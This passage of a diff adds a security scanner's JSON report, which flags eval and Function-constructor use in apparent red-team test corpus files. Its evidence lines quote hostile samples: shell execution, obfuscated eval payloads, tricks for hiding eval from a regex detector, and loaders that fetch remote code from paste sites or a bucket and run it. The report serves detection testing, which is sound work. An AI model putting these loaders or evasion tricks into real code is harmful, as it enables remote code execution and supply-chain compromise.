+      "evidence": "code: `const f = new Function('return 1'); f(); require('child_process').execFile('/bin/sh', ['-c', 'id']);`,",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "red-team\\corpus\\dynamic-code-exec-extended.js",
+      "line": 24,
+      "evidence": "description: 'base64 decode fed into new Function (OBFUSCATED_CODE_EXECUTION)',",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "red-team\\corpus\\dynamic-code-exec-extended.js",
+      "line": 25,
+      "evidence": "code: `const src = Buffer.from('cmV0dXJuIDQy', 'base64').toString(); const f = new Function(src); module.exports = f();`,",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec-extended.js",
+      "line": 67,
+      "evidence": "code: `eval(remoteCode); const shell = require('shelljs'); shell.ShellString('id').exec ? shell.exec('id') : 0;`,",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "red-team\\corpus\\dynamic-code-exec-extended.js",
+      "line": 74,
+      "evidence": "code: `const src = Buffer.from('72657475726e2031', 'hex').toString(); module.exports = new Function(src)();`,",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec-extended.js",
+      "line": 82,
+      "evidence": "description: 'eval(decodeURIComponent(...)) \u2014 decodeURIComponent is not a CODE_DECODE signal, and bare eval is WARN-only, so nothing chains',",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec-extended.js",
+      "line": 83,
+      "evidence": "code: `eval(decodeURIComponent('%72%65%71%75%69%72%65%28%31%29')); module.exports = {};`,",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec-extended.js",
+      "line": 90,
+      "evidence": "code: `const s = String.fromCharCode(97,108,101,114,116,40,49,41); eval(s); module.exports = {};`,",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec-extended.js",
+      "line": 97,
+      "evidence": "code: `const s = ')1(trela'.split('').reverse().join(''); eval(s); module.exports = {};`,",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec-extended.js",
+      "line": 117,
+      "evidence": "eval('void 0');",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec.js",
+      "line": 15,
+      "evidence": "eval(code);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "red-team\\corpus\\dynamic-code-exec.js",
+      "line": 26,
+      "evidence": "description: 'new Function(...) plus execSync process execution',",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "red-team\\corpus\\dynamic-code-exec.js",
+      "line": 28,
+      "evidence": "const f = new Function('return process.mainModule.require(\"child_process\")');",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec.js",
+      "line": 43,
+      "evidence": "eval(payload);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec.js",
+      "line": 56,
+      "evidence": "eval(src);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec.js",
+      "line": 69,
+      "evidence": "eval(src);",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec.js",
+      "line": 96,
+      "evidence": "code: `module.exports = eval('1 + 2');`,",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec.js",
+      "line": 107,
+      "evidence": "description: 'eval reached via computed member access this[\"ev\"+\"al\"] \u2014 no \"eval(\" literal for the regex',",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\dynamic-code-exec.js",
+      "line": 121,
+      "evidence": "description: 'eval aliased to a variable then called \u2014 source contains no \"eval(\" call site',",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "red-team\\corpus\\supply-chain-extended.js",
+      "line": 18,
+      "evidence": "code: `require('https').get('https://pastebin.com/raw/ZZ99', (r) => { let d=''; r.on('data', c=>d+=c); r.on('end', () => new Function(d)()); });`,",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\supply-chain-extended.js",
+      "line": 25,
+      "evidence": "code: `fetch('https://paste.ee/r/abcd1').then(r=>r.text()).then(t=>eval(t)); module.exports = {};`,",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "red-team\\corpus\\supply-chain-extended.js",
+      "line": 65,
+      "evidence": "code: `fetch('https://transfer.sh/abc/stage2.js').then(r=>r.text()).then(t=>new Function(t)()); module.exports = {};`,",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\supply-chain-extended.js",
+      "line": 99,
+      "evidence": "fetch('https://' + host + '/stage').then(r=>r.text()).then(t=>eval(t));",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\supply-chain-extended.js",
+      "line": 115,
+      "evidence": "code: `fetch('https://mybucket.s3.amazonaws.com/config.js').then(r=>r.text()).then(t=>eval(t)); module.exports = {};`,",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\supply-chain-extended.js",
+      "line": 129,
+      "evidence": "code: `eval(atob('Y29uc29sZS5sb2coJ3B3bmVkJyk=')); module.exports = {};`,",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "red-team\\corpus\\supply-chain.js",
+      "line": 17,
+      "evidence": "res.on('end', () => eval(d));",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_function_constructor",
+      "title": "Function constructor usage",
+      "file": "red-team\\corpus\\supply-chain.js",
+      "line": 31,
+      "evidence": "require('https').get(url, (r) => r.on('data', (d) => new Function(d.toString())()));",
+      "recommendation": "Avoid runtime code generation from strings."
+    },
+    {
+      "severity": "MEDIUM",
+      "type": "missing_pyproject",
+      "title": "Missing pyproject.toml",
+      "file": "pyproject.toml",
+      "line": null,
+      "evidence": "file not found",
+      "recommendation": "Define dependencies and build metadata in pyproject.toml."
+    }
+  ],
+  "scan_profile": "medium",
+  "gate_exceptions": {
+    "source": null,
+    "parse_error": null,
+    "invalid_entries": 0,
+    "applied": [],
+    "ignored_expired": [],
+    "remaining_violations": [],
+    "pass_with_exceptions": false
+  },
+  "baseline": {
+    "source": null,
+    "status": null,
+    "mode": null,
+    "active": false,
+    "approved_by": null,
+    "approved_at": null,
+    "expires_at": null,
+    "new_violations": [],
+    "resolved_violations": [],
+    "enforced_pass": false
+  }
+}
